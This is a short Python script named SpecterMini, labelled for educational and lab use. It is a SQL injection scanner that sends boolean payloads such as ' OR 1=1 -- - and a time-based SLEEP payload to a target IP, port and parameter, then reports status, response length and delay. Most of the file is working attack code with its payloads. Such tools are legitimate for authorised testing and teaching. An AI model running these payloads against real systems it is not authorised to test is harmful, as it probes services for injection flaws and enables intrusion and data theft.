#!/usr/bin/env python3
# SpecterMini - Simple SQLi Scanner
# Author: rhshourav
# Educational / Lab Use Only

import requests, argparse, time

TIMEOUT = 6

BOOLEAN_PAYLOADS = [
    "' OR 1=1 -- -",
    "' OR 'a'='a' -- -"
]

def boolean_test(url, param, method):
    print(f"\n[+] Boolean SQLi test on param: {param}")
    for p in BOOLEAN_PAYLOADS:
        data = {param: p}
        r = requests.request(method, url, data=data, timeout=TIMEOUT)
        print(f"  Payload: {p[:15]}... | Status: {r.status_code} | Len: {len(r.text)}")

def time_test(url, param, sleep, method):
    print(f"\n[+] Time-based SQLi test on param: {param}")
    payload = f"' OR IF(1=1,SLEEP({sleep}),0)-- -"
    data = {param: payload}

    t1 = time.time()
    requests.request(method, url, data=data, timeout=sleep+3)
    delta = time.time() - t1

    print(f"  Response time: {round(delta,2)}s")
    if delta > sleep * 0.6:
        print("  !!! POSSIBLE TIME-BASED SQLi !!!")

def main():
    parser = argparse.ArgumentParser(
        description="SpecterMini - Fast SQLi Lab Scanner"
    )
    parser.add_argument("--ip", required=True, help="Target IP")
    parser.add_argument("--port", default="80", help="Target Port")
    parser.add_argument("--path", default="/", help="Path (e.g. /login.php)")
    parser.add_argument("--param", default="username", help="Parameter name")
    parser.add_argument("--method", choices=["GET", "POST"], default="POST")
    parser.add_argument("--sleep", type=int, default=3, help="Sleep time")

    args = parser.parse_args()

    url = f"http://{args.ip}:{args.port}{args.path}"
    print("[*] Target:", url)

    boolean_test(url, args.param, args.method)
    time_test(url, args.param, args.sleep, args.method)

if __name__ == "__main__":
    main()
